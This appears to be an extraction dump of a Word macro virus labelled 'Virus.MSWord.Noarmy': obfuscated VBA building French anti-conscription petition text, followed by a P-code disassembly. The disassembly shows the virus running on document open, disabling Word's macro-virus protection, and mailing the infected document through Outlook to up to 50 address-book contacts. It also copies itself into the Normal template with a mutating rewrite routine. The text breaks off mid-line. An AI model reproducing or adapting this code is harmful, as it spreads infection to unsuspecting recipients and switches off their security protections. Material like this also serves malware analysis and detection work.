Chr(32) + "environ" + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32) ' zgtxqdzagpti
c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" _
+ Chr(32) + "militaire." + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," + Chr(32) + "rêveurs," + Chr(32) ' ivbd
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs": b2 = Chr(32) + "ou" + Chr(32) + "tout" + Chr(32) + "simplement" + Chr(32) + "amoureux" + Chr(32) + _
"qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + _
Chr(32) + "Vie" + Chr(32) ' ibbxlm
b2 = b2 + "pour" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) _
+ "mois." + Chr(32) + "Ils" + Chr(32) + "refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" _
+ Chr(32) + _
"service" + Chr(32) + "inégalitaire" + Chr(32) ' xbmsdb
b2 = b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + _
Chr(13) + "Pétition" + Chr(32) _
+ "pour" + Chr(32) + "les" + Chr(32) + "sursitaires" + Chr(32) + _
"sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' fdvmsdipq
b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) _
+ "militaire:" + Chr(32) + _
"http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" _
+ Chr(32) + _
"http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N." ' voxubmswmkqiw
a1 = a1 + Chr(32) + "qui" + Chr(32) + "tue" + Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn": e4 = Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) ' migbs
j17 = Chr(69) + Chr(110) _
+ Chr(100): c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98): End Sub ' fcwhujezhorom

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Noarmy
' ===============================================================================
' Module streams:
' Macros/VBA/NOSN - 53247 bytes
' Line #0:
' 	LineCont 0x000C 13 00 00 00 4A 00 00 00 55 00 00 00
' 	Dim 
' 	VarDefn h7
' 	VarDefn g8
' 	VarDefn j1
' 	VarDefn k2
' 	VarDefn j8
' 	VarDefn l1
' 	VarDefn m5
' 	VarDefn l8
' 	VarDefn a5
' 	VarDefn d3
' 	VarDefn g6
' 	VarDefn h3
' 	VarDefn k1
' 	VarDefn k5
' 	VarDefn g3
' 	VarDefn n6
' 	VarDefn h5
' 	VarDefn j5
' 	VarDefn k7
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn e8
' 	VarDefn b9
' 	VarDefn a7
' 	VarDefn d6
' 	VarDefn c5
' 	VarDefn e2
' 	VarDefn g1
' 	VarDefn l3
' 	VarDefn l9
' 	VarDefn n2
' 	VarDefn m1
' 	VarDefn h8
' 	VarDefn l5
' 	VarDefn i1
' 	VarDefn i7
' 	VarDefn e4
' 	VarDefn c7
' 	VarDefn c4
' 	VarDefn f3
' 	VarDefn h1
' 	VarDefn d8
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn g5
' 	VarDefn e1
' 	VarDefn m4
' 	VarDefn b3
' 	VarDefn d4
' 	VarDefn f7
' 	VarDefn i3
' 	VarDefn g2
' 	VarDefn e5
' 	VarDefn d2
' 	VarDefn a4
' 	VarDefn a3
' 	VarDefn a2
' 	VarDefn c2
' 	VarDefn d1
' 	VarDefn c3
' 	VarDefn c1
' 	VarDefn b2
' 	VarDefn b1
' 	VarDefn a1
' 	QuoteRem 0x004B 0x000C " nrotylgytee"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' 	QuoteRem 0x001C 0x0007 " vkljft"
' Line #2:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	ArgsCall (Call) f1 0x0000 
' 	QuoteRem 0x001E 0x0010 " aqbapxoroqvwzkm"
' Line #3:
' 	ArgsCall (Call) f2 0x0000 
' 	QuoteRem 0x0008 0x0005 " ufuv"
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	QuoteRem 0x003F 0x0010 " sneftrzdxprdbwr"
' Line #5:
' 	Ld j1 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x000C " prnzbaoycly"
' Line #6:
' 	LitDI4 0x0001 0x0000 
' 	Ld j1 
' 	Ld k2 
' 	Ld j8 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0038 0x000F " qpawhteutgnjmx"
' Line #7:
' 	Ld m5 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	QuoteRem 0x0020 0x000F " piohsrspwkfgtl"
' Line #8:
' 	Ld m5 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x001D 0x0010 " wxdqxnlngwqnwmk"
' Line #9:
' 	Ld m5 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld a5 
' 	St d8 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld d8 
' 	ArgsLd CreateObject 0x0001 
' 	Set c4 
' 	QuoteRem 0x004E 0x0010 " lhsjauxfiizadnw"
' Line #10:
' 	SetStmt 
' 	Ld l8 
' 	Ld c4 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set f3 
' 	BoS 0x0000 
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld h3 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld c4 
' 	SelectCase 
' 	QuoteRem 0x0071 0x000C " pokieyiqafb"
' Line #11:
' 	Ld k1 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld k5 
' 	Ld g3 
' 	Ld f3 
' 	ArgsMemCall Logon 0x0002 
' 	QuoteRem 0x0019 0x0010 " fzwsekvovjumwzq"
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld f3 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld i 
' 	Ld f3 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set g4 
' 	QuoteRem 0x0040 0x0009 " grkcmgai"
' Line #13:
' 	SetStmt 
' 	Ld m5 
' 	Ld c4 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set h1 
' 	BoS 0x0000 
' 	Ld g4 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St h2 
' 	QuoteRem 0x0039 0x0008 " bgguzxq"
' Line #14:
' 	Ld m5 
' 	St b6 
' 	QuoteRem 0x0008 0x000F " kvkfpkqyipjdtp"
' Line #15:
' 	LineCont 0x0004 1C 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld h2 
' 	For 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld j 
' 	Ld g4 
' 	ArgsMemLd AddressEntries 0x0001 
' 	Set j2 
' 	BoS 0x0000 
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	CaseGt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld j2 
' 	MemLd Address 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	Ld j2 
' 	MemLd Address 
' 	Ld n6 
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	SelectCase 
' 	QuoteRem 0x004B 0x000F " ofynhrtrmkzblo"
' Line #16:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000D 0x0010 " yoiniqmfzsojoyd"
' Line #17:
' 	Ld j2 
' 	Ld h1 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0015 0x000C " iszxzsknurq"
' Line #18:
' 	Ld b6 
' 	LitDI2 0x0001 
' 	Add 
' 	St b6 
' 	QuoteRem 0x000C 0x000B " wcwhhxegwg"
' Line #19:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0017 0x0005 " slgc"
' Line #20:
' 	Ld b6 
' 	SelectCase 
' 	QuoteRem 0x000F 0x0006 " jgvra"
' Line #21:
' 	LitDI2 0x0032 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0008 0x0007 " hychgo"
' Line #22:
' 	ExitFor 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FD5 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h5 
' 	Ld h1 
' 	MemSt Subject 
' 	BoS 0x0000 
' 	Ld j5 
' 	Ld h1 
' 	MemSt Body 
' 	QuoteRem 0x005F 0x000F " utrnojfdfgkjnn"
' Line #23:
' 	LitR8 0x851F 0x51EB 0x1EB8 0x3FE5 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x000F 0x000D " roeeusoapnne"
' Line #24:
' 	Ld g1 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x0010 0x000F " fuqjqdkgvcaufh"
' Line #25:
' 	Ld l3 
' 	Ld h1 
' 	MemSt Body 
' 	QuoteRem 0x000D 0x000E " avkjbahnlsaey"
' Line #26:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld l9 
' 	Ld h1 
' 	MemSt Subject 
' 	QuoteRem 0x001B 0x000B " elnelxuumd"
' Line #27:
' 	Ld n2 
' 	Ld h1 
' 	MemSt Body 
' 	QuoteRem 0x000D 0x0008 " scqzhty"
' Line #28:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld h1 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0037 0x000C " cmtzpngqeei"
' Line #29:
' 	Ld h1 
' 	ArgsMemCall Send 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0010 0x0006 " ozojl"
' Line #30:
' 	Ld f3 
' 	ArgsMemCall Logoff 0x0000 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0016 0x000E " smtgixupguodf"
' Line #31:
' 	Ld h3 
' 	Ld j1 
' 	Ld d3 
' 	Ld g6 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0039 0x0008 " uiyawfv"
' Line #32:
' 	LineCont 0x0008 0A 00 00 00 15 00 00 00
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set n1 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set i6 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set n1 
' 	QuoteRem 0x001B 0x000A " mvuhefepx"
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld n1 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set k3 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St i2 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x007D 0x000D " jxddlhfccxxy"
' Line #34:
' 	LineCont 0x0004 07 00 00 00
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld k3 
' 	Set b5 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld i6 
' 	Set f5 
' 	QuoteRem 0x0012 0x0010 " gpzhxnymenrjryx"
' Line #35:
' 	LitVarSpecial (True)
' 	St i2 
' 	QuoteRem 0x000A 0x000D " fpjqqebpytzw"
' Line #36:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x002C 0x0007 " cothmb"
' Line #37:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000E 0x000B " mxivvkgror"
' Line #38:
' 	SetStmt 
' 	Ld i6 
' 	Set b5 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld k3 
' 	Set f5 
' 	QuoteRem 0x0019 0x000E " pbpxygqemywws"
' Line #39:
' 	LitVarSpecial (True)
' 	St i2 
' 	QuoteRem 0x000A 0x000A " gvwfzszvm"
' Line #40:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000A " lfjonjgiz"
' Line #41:
' 	LineCont 0x0004 08 00 00 00
' 	Ld i2 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld b5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i4 
' 	QuoteRem 0x0021 0x000C " wynohjmgwcg"
' Line #42:
' 	Ld f5 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St c8 
' 	BoS 0x0000 
' 	Ld c8 
' 	SelectCase 
' 	QuoteRem 0x0030 0x0008 " iadcnub"
' Line #43:
' 	LineCont 0x0004 03 00 00 00
' 	LitDI2 0x0000 
' 	CaseGt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld c8 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x002F 0x0005 " iove"
' Line #44:
' 	LitDI2 0x0001 
' 	St c6 
' 	QuoteRem 0x0007 0x0005 " lthq"
' Line #45:
' 	LitStr 0x0000 ""
' 	St c9 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j3 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St a6 
' 	QuoteRem 0x0019 0x000E " dysxmghewoelr"
' Line #46:
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i4 
' 	For 
' 	BoS 0x0000 
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St h4 
' 	QuoteRem 0x0032 0x0005 " ctbh"
' Line #47:
' 	LitDI2 0x0001 
' 	St i 
' 	QuoteRem 0x0006 0x000F " acihnxfteblgde"
' Line #48:
' 	LitDI2 0x0001 
' 	Ld h4 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St f4 
' 	QuoteRem 0x001B 0x0008 " mixzjqj"
' Line #49:
' 	Ld f4 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000E " kjhxbtokwotut"
' Line #50:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0007 0x0006 " tcclf"
' Line #51:
' 	Ld h4 
' 	FnLen 
' 	St f4 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x0018 0x0006 " gkobo"
' Line #52:
' 	Ld f4 
' 	LitDI2 0x0002 
' 	Sub 
' 	St f4 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Do 
' 	QuoteRem 0x001C 0x000E " qyrbbyfgqzzne"
' Line #53:
' 	Ld i 
' 	Ld h4 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St j 
' 	BoS 0x0000 
' 	Ld j 
' 	SelectCase 
' 	QuoteRem 0x0029 0x0006 " npevw"
' Line #54:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h4 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' 	QuoteRem 0x0018 0x000D " bhrujzdylhzo"
' Line #55:
' 	LitVarSpecial (True)
' 	St b8 
' 	QuoteRem 0x000A 0x000D " pyjcogbhesuf"
' Line #56:
' 	Ld f4 
' 	LitDI2 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St b8 
' 	QuoteRem 0x0017 0x0007 " lwlhje"
' Line #57:
' 	CaseElse 
' 	QuoteRem 0x000A 0x000C " ertgcioslly"
' Line #58:
' 	LitVarSpecial (False)
' 	St b8 
' 	QuoteRem 0x000B 0x000E " biljksmdqismt"
' Line #59:
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld h4 
' 	Ld i 
' 	Ld j 
' 	Ld i 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St n5 
' 	QuoteRem 0x0023 0x000A " czrvaeobz"
' Line #60:
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x001A 0x000D " bdgxftgmxphz"
' Line #61:
' 	Ld l2 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld b5 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St f6 
' 	QuoteRem 0x0024 0x0006 " piknl"
' Line #62:
' 	LitDI2 0x0001 
' 	Ld f6 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St k4 
' 	QuoteRem 0x001B 0x0008 " dkateku"
' Line #63:
' 	LineCont 0x0004 09 00 00 00
' 	Ld k4 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St j3 
' 	BoS 0x0000 
' 	CaseElse 
' 	QuoteRem 0x000E 0x0009 " vkigfkzl"
' Line #64:
' 	Ld f6 
' 	LitDI2 0x0001 
' 	Ld k4 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St j3 
' 	QuoteRem 0x0018 0x0005 " bzto"
' Line #65:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0017 0x000C " kkxeqbhjgvg"
' Line #66:
' 	Ld n5 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	BoS 0x0000 
' 	Ld e8 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0048 0x0008 " kmonhjq"
' Line #67:
' 	Ld k7 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n5 
' 	QuoteRem 0x0012 0x000E " ykaewtxctjnfu"
' Line #68:
' 	Ld k7 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0008 0x0008 " mmuwski"
' Line #69:
' 	Ld e8 
' 	St n5 
' 	BoS 0x0000 
' 	Ld e8 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0011 0x000F " rdyimwntbzzdup"
' Line #70:
' 	Ld k7 
' 	St n5 
' 	QuoteRem 0x0008 0x0007 " pfovdg"
' Line #71:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0008 " izqznso"
' Line #72:
' 	Ld h6 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x002E 0x000F " pxmytuxrzhbjpm"
' Line #73:
' 	LineCont 0x0004 02 00 00 00
' 	LitR8 0x147B 0x47AE 0x7AE1 0x3F94 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x0012 0x000E " vuouikpjyvqki"
' Line #74:
' 	CaseElse 
' 	QuoteRem 0x000A 0x000B " bxumhidsun"
' Line #75:
' 	LitVarSpecial (False)
' 	St h6 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0026 0x0009 " ximlosne"
' Line #76:
' 	Ld l2 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld i4 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	QuoteRem 0x0023 0x000D " ukrhdqkbcbit"
' Line #77:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000E " dsxtqfpnagdah"
' Line #78:
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0038 0x0007 " lofmmb"
' Line #79:
' 	Ld j3 
' 	SelectCase 
' 	QuoteRem 0x000F 0x000F " qwxsvdyklpcnqk"
' Line #80:
' 	Ld e4 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	Ld a6 
' 	LitDI2 0x0001 
' 	Add 
' 	St a6 
' 	BoS 0x0000 
' 	Ld a6 
' 	SelectCase 
' 	QuoteRem 0x0030 0x000F " frixjsbnsnlgwi"
' Line #81:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld i4 
' 	St l2 
' 	QuoteRem 0x0010 0x000F " eiumkcdqoerasy"
' Line #82:
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld h4 
' 	Ld c7 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x0035 0x0005 " djpp"
' Line #83:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x000D 0x000A " kwpcarmzg"
' Line #84:
' 	Ld n5 
' 	SelectCase 
' 	QuoteRem 0x000F 0x0008 " fkdlogc"
' Line #85:
' 	Ld j17 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St h6 
' 	QuoteRem 0x0015 0x000F " zznjsktlkxtxot"
' Line #86:
' 	CaseElse 
' 	QuoteRem 0x000A 0x0007 " rdibpn"
' Line #87:
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0022 0x000C " pjphqdwbxwp"
' Line #88:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0006 " fxgrs"
' Line #89:
' 	EndSelect 
' 	QuoteRem 0x000B 0x0007 " pcdczi"
' Line #90:
' 	Ld n5 
' 	FnLen 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x0022 0x000C " nsuzvvknfxw"
' Line #91:
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' 	QuoteRem 0x0036 0x000E " wxwlmnsecyftf"
' Line #92:
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St h6 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0038 0x000C " qrcgwqocyza"
' Line #93:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000D " tzqezmohimrz"
' Line #94:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000C " wmuxgdsxicq"
' Line #95:
' 	CaseElse 
' 	QuoteRem 0x000A 0x0008 " coimtgi"
' Line #96:
' 	LitVarSpecial (False)
' 	St h6 
' 	QuoteRem 0x000B 0x0006 " qklzi"
' Line #97:
' 	LineCont 0x0004 05 00 00 00
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld n5 
' 	SelectCase 
' 	QuoteRem 0x001E 0x000F " wtfhsyotfdzqca"
' Line #98:
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000D 0x0008 " odebuel"
' Line #99:
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld j1 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x0035 0x0008 " ptthagd"
' Line #100:
' 	LitVarSpecial (False)
' 	St j4 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x005B 0x000E " oxmizurpamfmf"
' Line #101:
' 	LitVarSpecial (True)
' 	St j4 
' 	QuoteRem 0x000A 0x000B " grefpmnfdr"
' Line #102:
' 	EndSelect 
' 	QuoteRem 0x000B 0x000E " lmjvtsmflhvfn"
' Line #103:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld n5 
' 	FnLen 
' 	Ld n5 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	SelectCase 
' 	QuoteRem 0x0033 0x000A " mcorocefc"
' Line #104:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0007 0x0008 " zamzhrx"
' Line #105:
' 	LineCont 0x0004 18 00 00 00
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd Switch 0x0004 
' 	Add 
' 	St c9 
' 	QuoteRem 0x0015 0x0007 " azahpf"
' Line #106:
' 	LitVarSpecial (False)
' 	St j4 
' 	QuoteRem 0x000B 0x000A " hodcbohgu"
' Line #107:
' 	CaseElse 
' 	BoS 0x0000 
' 	Ld c9 
' 	Ld h6 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0001 
' 	Ld n5 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld h6 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld n5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
